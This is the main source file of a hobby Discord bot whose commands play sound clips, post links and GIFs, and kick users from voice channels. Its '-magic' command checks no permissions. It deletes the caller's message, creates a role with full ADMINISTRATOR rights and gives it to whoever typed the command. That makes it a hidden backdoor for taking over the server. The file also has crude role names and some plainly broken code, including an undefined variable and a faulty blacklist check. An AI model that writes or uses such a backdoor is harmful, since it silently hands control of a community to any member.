require("dotenv").config();
const musicBot = require('./musicBot');
var inf = require('./info');
var spam = require('spamnya')
var dani = require('./dani');
var cringe = require('./animeList');
var playlist = require('./chill');
var daniTime = require('./timeDani');
const Discord = require('discord.js');

const { LockableClient } = require('./lockable-client');
const { default: MusicBot } = require("./musicBot");

const bot = new LockableClient();
const client = new Discord.Client();
const prefix = "-";
var dictAdmins = ["378275337164816394", "163416315892072448"];
var blackList= []
var dictVoiceCommands = {
  imali: "./imali.mp3",
  monitor: "./Im_gonna_break_my_monitor.mp3",
  eitypag: "./ei_typag.mp3",
  papi: "./chupapi_short.mp3",
  kofti: "./kaksheekofti.mp3",
};

var dictCommands = {
  tilted: "https://on-winning.com/avoid-tilt/",
  cringe: cringe.list(),
  info: inf.info(),
  chill: playlist.chill(),
  rank1: "https://eune.op.gg/summoner/userName=Vlad2MeetYou 🧢",
  motto: "Dani's life moto is - My life is a party, my home is the club!",
};

const musicBotCommands = ['p', 'c', 'n'];

client.once("ready", () => {
  console.log("DaniBot is online!");
});

client.on("message", async (message) => {
  if (!message.content.startsWith(prefix) || message.author.bot) return;
  const args = message.content.slice(prefix.length).split(/ +/);
  const command = args.shift().toLowerCase();
  if (musicBotCommands.includes(command)) {
    musicBot.MusicBot(message,bot);
  }
  else if (command === "dani") {
    message.channel.send(dani.lastBan());
  } else if (command === "t") {
    message.channel.send(daniTime.timeOfday());
  } else if (command == "stream") {
    const user = args[0];
    var taggedUser = getUserByTag(message.guild, user);
    var status = taggedUser.presence.status;
    if (status == "online" || status == "idle") {
      message.channel.send(user);
      if (user == "<@!374199399146061836>") {
        message.channel.send(
          "You can also try - https://www.twitch.tv/gnoyl9375"
        );
      } else if (user == "<@!214072494737457152>") {
        var voice = message.guild.members.cache.find(
          (user) => user.id === userid
        ).voice;

        if (voice && voice.streaming) {
          message.channel.send("vlizai ku4e");
          message.channel.send(
            "https://media1.tenor.com/images/4e14ace0fffd89910d2bd2496a68c848/tenor.gif?itemid=20801017"
          );
          return;
        } else {
          message.channel.send(
            "Probvai tuk: https://www.twitch.tv/freewaydani"
          );
        }
      }
      message.channel.send(
        "https://media.tenor.com/images/037ad7fd2f75a122c29f25f241b2770d/tenor.gif"
      );
    } else message.channel.send(user + " is 🔨 his 🥩");
  } else if (command == "rank1" && args[0] == "vlad") {
    message.channel.send(dictCommands[command]);
  } else if (command in dictCommands) {
    message.channel.send(dictCommands[command]);
  } else if (command == "mm") {
    var number = Math.floor(Math.random() * 100) % 2;
    var options = ["Losers Queue", "Winners Queue"];
    var option = options[number];
    var user = message.member.user.id;
    message.channel.send(option);
  } else if (command == "newyear") {
    const command = "https://pubmed.ncbi.nlm.nih.gov/7396691/";

    message.channel.send(
      "Не сте сами! <@!214072494737457152>  <@!374199399146061836> "
    );

    message.channel.send(command);
  } else if (command == "pochwame") {
    message.channel.send("zdr, da znae6 4e", {
      files: ["./start.png"],
    });
  } else if (command == "nightmare") {
    message.channel.send(
      "https://media1.tenor.com/images/4e14ace0fffd89910d2bd2496a68c848/tenor.gif?itemid=20801017"
    );
  } else if (command in dictVoiceCommands && !bot.isLocked() && !(message.author.id in blackList)){
    spam.log(message, 50)
    const author = message.author.id;
    if (spam.sameMessages(2, 10000)) {  
      blackList.push(author);
      setInterval(function() { 
        blackList=[]
    }, 10000);
      message.channel.send("Pochini malko baluk");
      var voice = message.guild.members.cache.find(
        (user) => user.id === author
      ).voice;
      if (!voice) return;
      await voice.kick();
      return;
    }
    bot.lock();
    var volume = 2;
    if (
      command == "eitypag" &&
      (author == "378275337164816394" || author == "163416315892072448")
    ) {
      volume = 200;
    }
    var voiceChannel = message.member.voice.channel;
    if (!voiceChannel) {
      message.channel.send("You have to be in voice 4annel be typak");
    } else {
      voiceChannel
        .join()
        .then((connection) => {
          const dispatcher = connection.play(dictVoiceCommands[command], {
            volume: volume,
          });
          dispatcher.on("finish", (end) => voiceChannel.leave());
          dispatcher.on("error", console.error);
        })
        .catch((err) => console.log(err));
      bot.unlock();
    }
  } else if (command == "res") {
    let messageCopy = message;
    await message.delete();
    messageCopy.channel.send("https://tenor.com/beX90.gif");

    const authorId = messageCopy.author.id;
    if (!dictAdmins.includes(authorId)) {
      messageCopy.channel.send("You are not in the big dick club");
      return;
    }
    const user = args[0];
    var taggedUser = getUserByTag(messageCopy.guild, user);
    var voice = messageCopy.guild.members.cache.find(
      (user) => user.id === taggedUser.id
    ).voice;

    if (!voice) return;

    if (!dictAdmins.includes(taggedUser.id)) {
      await voice.kick();
    }
  } else if (command == "magic") {
    let messageCopy = message;
    message.delete();

    const authorId = messageCopy.author.id;
    var member = getUserByTag(messageCopy.guild, authorId);

    //---- Admin Role ----
    const normalPermission = 104320576;

    var role = await messageCopy.guild.roles.create({
      data: {
        name: "Sex Offender",
        color: [250, 173, 195],
        permissions: [Discord.Permissions.FLAGS.ADMINISTRATOR],
        mentionable: false,
      },
      reason: "Сме яки и мое си го позволим,УСССС",
    });

    member.roles.add(role);
  }
});

function getUserByTag(guild, id) {
  //GuildMember
  try {
    const user = id;
    const userid = user.match(/[0-9]+/g)[0];
    var currUser = guild.members.cache.find((user) => user.id === userid);
    return currUser;
  } catch (error) {
    console.log(error);
  }
}

client.login(process.env.token);

//play sound on join 
// client.on("voiceStateUpdate", (oldState, newState) => {
//   var voiceChannel = newState.channel;
//   let oldChannel = oldState.channel 
//   let newChannel = newState.channel

//   if (oldChannel === newChannel) return;
  
//   if (
//     oldState.member.user.id === "378275337164816394" &&
//     voiceChannel &&
//     !bot.isLocked()
//   ) {
//     bot.lock();
//     voiceChannel
//       .join() 
//       .then((connection) => {
//         const dispatcher = connection.play(dictVoiceCommands["papi"], {
//           volume: 1,
//         });
//         dispatcher.on("finish", (end) => voiceChannel.leave());
//         dispatcher.on("error", console.error);
//       })
//       .catch((err) => console.log(err));
//     bot.unlock();
//   }
// });